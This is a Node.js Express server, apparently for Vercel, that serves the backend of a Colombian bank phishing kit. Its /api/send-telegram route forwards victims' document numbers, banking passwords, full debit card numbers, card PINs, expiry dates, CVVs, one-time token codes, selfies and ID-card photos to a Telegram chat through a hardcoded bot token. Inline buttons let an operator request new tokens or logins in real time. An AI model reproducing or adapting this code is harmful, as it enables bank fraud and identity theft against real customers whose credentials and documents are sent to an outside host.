const express = require('express');
const path = require('path');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');

// Configuración inicial
const app = express();
const token = process.env.TELEGRAM_TOKEN || '7314533621:AAHyzTNErnFMOY_N-hs_6O88cTYxzebbzjM';
const chatId = process.env.TELEGRAM_CHAT_ID || '-1002638389042';

// Middlewares - Aumentar límite para manejar imágenes base64
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Configurar CORS y cabeceras
app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    next();
});

// Servir archivos estáticos
app.use(express.static(path.join(__dirname, '..')));

// Configurar el bot de Telegram
const bot = new TelegramBot(token, { webHook: true });

// Ruta principal
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

// Ruta para archivos HTML
app.get('/*.html', (req, res) => {
    res.sendFile(path.join(__dirname, '..', req.path));
});

// Rutas API
app.post('/api/send-telegram', async (req, res) => {
    try {
        console.log('📨 Recibido request en /api/send-telegram');
        console.log('📦 Body:', JSON.stringify(req.body).substring(0, 200) + '...');
        console.log('🔍 Tipo de dato:', req.body.tipo);
        
        if (req.body.foto) {
            console.log('📸 Detectada foto en el request');
            console.log('📏 Tamaño aprox:', req.body.foto.length, 'caracteres');
        }
        
        const result = await sendTelegramMessage(req.body);
        
        console.log('✅ Mensaje enviado exitosamente a Telegram');
        console.log('🆔 Message ID:', result.message_id);
        
        res.json({
            success: true,
            messageId: result.message_id
        });
    } catch (error) {
        console.error('❌ Error al enviar mensaje:', error);
        console.error('Stack trace:', error.stack);
        res.status(500).json({
            success: false,
            error: error.message || 'Error al procesar la solicitud'
        });
    }
});

// Webhook de Telegram
app.post('/api/webhook', (req, res) => {
    try {
        bot.processUpdate(req.body);
        res.sendStatus(200);
    } catch (error) {
        console.error('Error en webhook:', error);
        res.sendStatus(500);
    }
});

// Función para enviar mensajes
async function sendTelegramMessage(data) {
    try {
        console.log('🔧 Procesando mensaje para Telegram...');
        
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '❌ Error de Logo', callback_data: 'error_logo' },
                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
                ],
                [
                    { text: '❌ Error de Token', callback_data: 'error_token' },
                    { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
                ],
                [
                    { text: '✅ Finalizar', callback_data: 'finalizar' }
                ]
            ]
        };

        // Si es una foto (base64), enviarla como imagen
        if (data.foto) {
            console.log('📸 Procesando foto para envío...');
            
            try {
                // Verificar que la foto tenga el formato correcto
                if (!data.foto.includes('base64,')) {
                    throw new Error('Formato de foto inválido');
                }
                
                const buffer = Buffer.from(data.foto.split(',')[1], 'base64');
                console.log('📦 Buffer creado, tamaño:', buffer.length, 'bytes');
                
                let caption;
                
                if (data.tipo === 'Selfie') {
                    caption = `📸 SELFIE DE VERIFICACIÓN\n\n🆔 Message ID: ${data.messageId}\n📅 ${new Date().toLocaleString('es-CO')}`;
                } else if (data.tipo === 'Cédula') {
                    caption = `🪪 DOCUMENTO DE IDENTIDAD\n\n🆔 Message ID: ${data.messageId}\n📅 ${new Date().toLocaleString('es-CO')}`;
                }
                
                console.log('📤 Enviando foto a Telegram con botones...');
                
                const result = await bot.sendPhoto(chatId, buffer, {
                    caption: caption,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });
                
                console.log('✅ Foto enviada con éxito, Message ID:', result.message_id);
                return result;
                
            } catch (photoError) {
                console.error('❌ Error procesando/enviando foto:', photoError);
                throw photoError;
            }
        }

        // Enviar mensaje de texto
        console.log('📝 Procesando mensaje de texto...');
        
        let messageText;
        if (typeof data === 'object') {
            if (data.tipo === 'Clave Segura') {
                messageText = `🔐 NUEVA SOLICITUD DE INGRESO\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento}\n` +
                            `🔢 Número: ${data.numeroDocumento}\n` +
                            `🔑 Clave: ${data.clave}\n` +
                            `📅 Fecha: ${new Date().toLocaleString('es-CO')}`;
            } else if (data.tipo === 'Tarjeta Débito') {
                messageText = `💳 NUEVA SOLICITUD DE INGRESO\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento}\n` +
                            `🔢 Número: ${data.numeroDocumento}\n\n` +
                            `💳 DATOS DE TARJETA:\n` +
                            `🔢 Número Completo: ${data.numeroTarjeta}\n` +
                            `🔑 Clave: ${data.claveTarjeta}\n` +
                            `📅 Vencimiento: ${data.fechaVencimiento}\n` +
                            `🔐 CVV: ${data.cvv}\n\n` +
                            `⏰ Fecha: ${new Date().toLocaleString('es-CO')}`;
            } else if (data.tipo === 'Token') {
                messageText = `🔐 VERIFICACIÓN DE TOKEN\n\n` +
                            `🔑 Código: ${data.codigo}\n` +
                            `⏰ Timestamp: ${data.timestamp}`;
            } else {
                messageText = JSON.stringify(data, null, 2);
            }
        } else {
            messageText = data.toString();
        }

        console.log('📤 Enviando mensaje de texto a Telegram con botones...');
        console.log('📄 Longitud del mensaje:', messageText.length, 'caracteres');

        const result = await bot.sendMessage(chatId, messageText, {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });

        console.log('✅ Mensaje enviado con éxito, Message ID:', result.message_id);
        return result;
        
    } catch (error) {
        console.error('❌ Error en sendTelegramMessage:', error);
        console.error('Stack:', error.stack);
        throw error;
    }
}

// Manejar callbacks de Telegram
bot.on('callback_query', async (callbackQuery) => {
    if (!callbackQuery || !callbackQuery.message) {
        console.error('Callback query inválido');
        return;
    }

    try {
        const action = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;

        await bot.answerCallbackQuery(callbackQuery.id);

        if (action === 'finalizar') {
            await bot.editMessageText('✅ Proceso finalizado exitosamente', {
                chat_id: chatId,
                message_id: messageId,
                reply_markup: { inline_keyboard: [] }
            });
        }
    } catch (error) {
        console.error('Error al procesar callback query:', error);
    }
});

// Handler para Vercel
const handler = (req, res) => {
    // Asegurarse de que las rutas funcionen
    if (!res.headersSent) {
        return app(req, res);
    }
};

module.exports = handler;